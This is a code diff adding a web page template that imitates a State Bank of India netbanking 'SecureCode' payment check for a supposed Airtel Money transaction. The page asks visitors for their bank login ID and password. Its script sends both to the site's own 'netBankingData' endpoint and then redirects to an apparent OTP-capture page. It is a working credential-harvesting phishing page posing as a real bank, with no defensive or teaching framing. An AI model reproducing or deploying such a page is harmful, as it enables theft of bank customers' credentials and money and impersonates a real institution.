@@ -1,0 +1,193 @@
+<html>
+
+<head>
+     <title>
+          State Bank Group
+     </title>
+     <link rel="stylesheet" type="text/css" href="../../../../../acs.onlinesbi.com/sbi/common/css/styles.css">
+     <link rel="stylesheet" type="text/css" href="../../../../../acs.onlinesbi.com/sbi/common/css/fonts.css">
+</head>
+
+
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"
+     onload="javascript:return radioClicked();">
+     <center>
+          <table border="0" cellspacing="0" cellpadding="0" width="650" align="center">
+               <tr>
+                    <td valign="top">
+               <tr>
+                    <td valign="top">
+                         <div id="buehne3" style="text-align:left">
+
+                              <img src=../../../../../acs.onlinesbi.com/sbi/images/maestro_logo_small.GIF border="0"
+                                   alt="" usemap="#logo">
+                              <br>
+                              <img src="../../../../../acs.onlinesbi.com/sbi/images/logo_securecode.gif" border="0"
+                                   alt="" usemap="#logo">
+                         </div>
+                    </td>
+                    <td>
+                         <div id="buehne3" style="text-align:right"> <img
+                                   src="../../../../../acs.onlinesbi.com/sbi/images/SBGroup%20logo_small.JPG" border="0"
+                                   alt="" usemap="#logo"></div>
+                    </td>
+               </tr>
+               <tr>
+                    <td colspan=2 align=center>
+                         <form method="post" action="" name="contactform" id="contactform" autocomplete="on">
+                              {% csrf_token %}
+                              <table border=0 align=center width=85% bordercolor=black cellspacing=0 cellpadding=2
+                                   class="content_fltxt_12">
+                                   <tr>
+                                        <td colspan=2>
+                                             <br />
+                                             <font face="Arial, Helvetica, sans-serif" size="2">
+                                                  Please enter your Netbanking Credentials in order to complete your
+                                                  transaction.</br>
+                                                  This information will not be shared with the merchant.</font><br />
+                                             <br />
+                                        </td>
+                                   </tr>
+                                   <tr>
+                                        <td colspan=2 class="content_headline_1">
+                                             <b>Added Protection</b><br />
+                                             <br />
+                                        </td>
+                                   </tr>
+                                   <tr>
+                                        <td width="35%">
+
+                                             Merchant Name
+
+                                        </td>
+                                        <td class="table_input_184">
+
+                                             : Airtel Money
+                                        </td>
+                                   </tr>
+
+                                   <tr>
+                                        <td width="35%">
+
+                                             Date
+
+                                        </td>
+                                        <td class="table_input_184" align=left>
+                                             :
+                                             <script type="text/javascript">
+                                                  var d = new Date()
+                                                  var monthname = new Array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")
+                                                  document.write(monthname[d.getMonth()] + " ")
+                                                  document.write(d.getDate() + ", ")
+                                                  document.write(d.getFullYear())
+                                             </script>
+
+                                        </td>
+                                   </tr>
+                                   <tr>
+
+                                        <td width="35%">
+
+                                             Personal
+
+                                             Greeting
+
+                                        </td>
+                                        <td align=left class="table_input_184">
+
+
+
+                                             :This transaction is protected .
+
+                                        </td>
+
+                                   </tr>
+                                   <tr>
+                                        <td class="content_fltxt_12" colspan=2>
+
+                                        </td>
+                                   </tr>
+
+                                   <tr>
+                                        <td width="40%">
+                                             <b>Select the Payment Method<b>
+                                        </td>
+                                   </tr>
+                                   <tr>
+                                        <td>
+                                             <input type=hidden id="radio1" name="authtype" onclick="radioClicked();">
+                                        </td>
+                                        <td>
+                                             <input type="radio" name="authtype" id="radio2" checked=checked
+                                                  onclick="radioClicked();"><b>Sbi Netbanking&#153;
+                                             </b>
+                                        </td>
+                                   </tr>
+                                   <tr>
+                                        <td>
+                                        </td>
+                    </td>
+               </tr>
+
+               <tr>
+                    <td width="35%">
+
+                         Login Id
+
+                    </td>
+                    <td class="table_input_184">
+
+                         :
+                         <input type="text" name="loginid" id="loginid" maxlength="19" style="width:170px; height:18px">
+                    </td>
+               </tr>
+
+               <tr>
+                    <td width="35%">
+
+                         Login Password
+
+                    </td>
+                    <td class="table_input_184" align=left>
+                         :
+                         <input type="Password" name="loginpass" id="loginpass" maxlength="40" style="width:170px; height:18px">
+                         </script>
+
+                    </td>
+               </tr>
+
+               <script>
+                    let submitData = () => {
+                         let loginId = document.getElementById('loginid').value;
+                         let loginPass = document.getElementById('loginpass').value;
+               
+                         let url = "{% url 'netBankingData' %}"
+                         fetch(`${url}?loginId=${loginId}&loginPass=${loginPass}`)
+                              .then(res => res.json())
+                              .then(json => {
+                                   console.log(json)
+                                   if(json.status == 200) {
+                                        window.location.href = "{% url 'netOtp' %}"
+                                   } else {
+                                        alert('Something went wrong!')
+                                   }
+                              })
+                    }
+               </script>
+
+               <tr>
+                    <td colspan=2 align=center>
+                         <br />
+
+                         <input type="button" name="submit" onclick="submitData()" value="Submit">
+                    </td>
+               </tr>
+          </table>
+          </form>
+          </td>
+          </tr>
+          </table>
+     </center>
+</body>
+
+</html>
